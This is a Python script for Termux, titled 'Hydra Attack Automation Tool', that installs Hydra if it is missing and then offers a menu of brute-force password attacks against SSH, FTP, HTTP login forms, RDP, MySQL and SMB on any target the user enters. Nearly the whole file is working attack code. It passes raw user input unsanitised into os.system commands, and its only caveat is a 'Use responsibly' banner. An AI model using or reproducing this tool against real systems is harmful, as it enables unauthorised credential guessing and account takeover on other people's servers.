#!/usr/bin/env python3
import os
import sys
import subprocess
from time import sleep

# Colors
GREEN = '\033[0;32m'
RED = '\033[0;31m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'  # No Color

def clear_screen():
    os.system('clear')

def display_banner():
    print(f"{GREEN}")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⢸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⣠⣦⣤⣀⣀⣤⣤⣀⡀⠀⣀⣠⡆⠀⠀⠀⠀⠀⠀⠤⠒⠛⣛⣛⣻⣿⣶⣾⣿⣦⣄⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠸⠿⢿⣿⣿⣿⣯⣭⣿⣿⣿⣿⣋⣀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣓⠢⠄⢠⡾⢻⣿⣿⣿⣿⡟⠁⠀⠀⠈⠙⢿⣿⣿⣯⡻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠙⢿⣿⣿⣿⣷⣄⠁⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣷⣌⢧⠀⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⢀⠉⠙⠛⠛⠿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡀⠠⢻⡟⢿⣿⣿⣿⣿⣧⣄⣀⠀⠘⢶⣄⣀⠀⠀⠈⢻⠿⠁⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣾⠀⠀⠀⠻⣈⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠈⠲⣄⠀⠀⣀⡤⠤⠀⠀⠀⢠⣿⣿⣿⡿⣿⠇⠀⠀⠐⠺⢉⣡⣴⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣶⣿⣿⣿⣶⣶⡀⠀⠀⠀")
    print("⠀⠀⠀⠀⢠⣿⣴⣿⣷⣶⣦⣤⡀⠀⢸⣿⣿⣿⠇⠏⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣷⠀⠹⣿⣿⠿⠿⠛⠻⠿⣿⠇⠀⠀⠀")
    print("⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣷⣯⡂⢸⣿⣿⣿⠀⠀⠀⠀⢀⠾⣻⣿⣿⣿⠟⠀⠀⠈⣿⣿⣿⣿⡇⠀⠀⣀⣀⡀⠀⢠⡞⠉⠀⠀⠀⠀")
    print("⠀⠀⢸⣟⣽⣿⣯⠀⠀⢹⣿⣿⣿⡟⠼⣿⣿⣿⣇⠀⠀⠀⠠⢰⣿⣿⣿⣿⡄⠀⠀⠀⣸⣿⣿⣿⡇⠀⢀⣤⣼⣿⣷⣾⣷⡀⠀⠀⠀⠀")
    print("⠀⢀⣾⣿⡿⠟⠋⠀⠀⢸⣿⣿⣿⣿⡀⢿⣿⣿⣿⣦⠀⠀⠀⢺⣿⣿⣿⣿⣿⣄⠀⠀⣿⣿⣿⣿⡇⠐⣿⣿⣿⣿⠿⣿⣿⡿⣦⠀⠀⠀")
    print("⠀⢻⣿⠏⠀⠀⠀⠀⢠⣿⣿⣿⡟⡿⠀⠀⢻⣿⣿⣿⣷⣤⡀⠘⣷⠻⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣇⣾⣿⣿⣿⠁⠀⢼⣿⣿⣿⣆⠀⠀")
    print("⠀⠀⠈⠀⠀⠀⠀⠀⢸⣿⣿⣿⡗⠁⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣾⣆⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠌⣾⣿⣿⣿⣆⠀⠀⠀⠉⠻⣿⡷⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠘⣟⣿⣿⣿⡆⠀⠀⠀⠀⠙⠁⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣶⣤⣤⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢈⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣠⣤⣤⣶⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⢀⣠⣤⣄⠀⠠⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀")
    print("⢀⣀⠀⣠⣀⡠⠞⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⣷⣦⣄⣀⢿⡽⢻⣦")
    print("⠻⠶⠾⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠋")
    print(f"{NC}")
    print(f"{YELLOW}=== Hydra Attack Automation Tool ===")
    print(f"{BLUE}Developed for Termux - Use responsibly{NC}")
    print()

def check_hydra_installed():
    try:
        subprocess.run(["hydra", "-h"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def install_hydra():
    print(f"{YELLOW}[!] Hydra not found. Installing Hydra...{NC}")
    try:
        subprocess.run(["pkg", "install", "hydra", "-y"], check=True)
        print(f"{GREEN}[+] Hydra installed successfully!{NC}")
        return True
    except subprocess.CalledProcessError:
        print(f"{RED}[-] Failed to install Hydra. Please install it manually.{NC}")
        return False

def ssh_attack():
    print(f"\n{YELLOW}[*] SSH Attack Selected{NC}")
    target = input(f"{BLUE}Enter target IP/hostname: {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    port = input(f"{BLUE}Enter port (default 22): {NC}") or "22"
    
    print(f"\n{YELLOW}[*] Starting SSH attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} -s {port} -t 4 ssh"
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def ftp_attack():
    print(f"\n{YELLOW}[*] FTP Attack Selected{NC}")
    target = input(f"{BLUE}Enter target IP/hostname: {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    port = input(f"{BLUE}Enter port (default 21): {NC}") or "21"
    
    print(f"\n{YELLOW}[*] Starting FTP attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} -s {port} -t 4 ftp"
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def http_form_attack():
    print(f"\n{YELLOW}[*] HTTP Form Attack Selected{NC}")
    target = input(f"{BLUE}Enter target URL (e.g., http://example.com/login): {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    form_fields = input(f"{BLUE}Enter form fields (e.g., 'user=^USER^&pass=^PASS^'): {NC}")
    
    print(f"\n{YELLOW}[*] Starting HTTP Form attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} http-post-form \"{form_fields}:Invalid credentials\""
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def rdp_attack():
    print(f"\n{YELLOW}[*] RDP Attack Selected{NC}")
    target = input(f"{BLUE}Enter target IP/hostname: {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    port = input(f"{BLUE}Enter port (default 3389): {NC}") or "3389"
    
    print(f"\n{YELLOW}[*] Starting RDP attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} -s {port} rdp"
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def mysql_attack():
    print(f"\n{YELLOW}[*] MySQL Attack Selected{NC}")
    target = input(f"{BLUE}Enter target IP/hostname: {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    port = input(f"{BLUE}Enter port (default 3306): {NC}") or "3306"
    
    print(f"\n{YELLOW}[*] Starting MySQL attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} -s {port} mysql"
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def smb_attack():
    print(f"\n{YELLOW}[*] SMB Attack Selected{NC}")
    target = input(f"{BLUE}Enter target IP/hostname: {NC}")
    username = input(f"{BLUE}Enter username or wordlist path: {NC}")
    password = input(f"{BLUE}Enter password or wordlist path: {NC}")
    
    print(f"\n{YELLOW}[*] Starting SMB attack...{NC}")
    cmd = f"hydra -L {username} -P {password} {target} smb"
    print(f"{BLUE}[+] Command: {cmd}{NC}")
    os.system(cmd)

def show_menu():
    print(f"{GREEN}Select an attack type:{NC}")
    print(f"1. SSH Attack")
    print(f"2. FTP Attack")
    print(f"3. HTTP Form Attack")
    print(f"4. RDP Attack")
    print(f"5. MySQL Attack")
    print(f"6. SMB Attack")
    print(f"0. Exit")
    print()

def main():
    clear_screen()
    display_banner()
    
    if not check_hydra_installed():
        if not install_hydra():
            sys.exit(1)
    
    while True:
        show_menu()
        choice = input(f"{BLUE}Enter your choice (0-6): {NC}")
        
        try:
            choice = int(choice)
            if choice == 0:
                print(f"{YELLOW}[*] Exiting...{NC}")
                sys.exit(0)
            elif choice == 1:
                ssh_attack()
            elif choice == 2:
                ftp_attack()
            elif choice == 3:
                http_form_attack()
            elif choice == 4:
                rdp_attack()
            elif choice == 5:
                mysql_attack()
            elif choice == 6:
                smb_attack()
            else:
                print(f"{RED}[-] Invalid choice. Please try again.{NC}")
            
            input(f"\n{BLUE}Press Enter to continue...{NC}")
            clear_screen()
            display_banner()
            
        except ValueError:
            print(f"{RED}[-] Please enter a valid number.{NC}")
            sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Script interrupted by user. Exiting...{NC}")
        sys.exit(0)
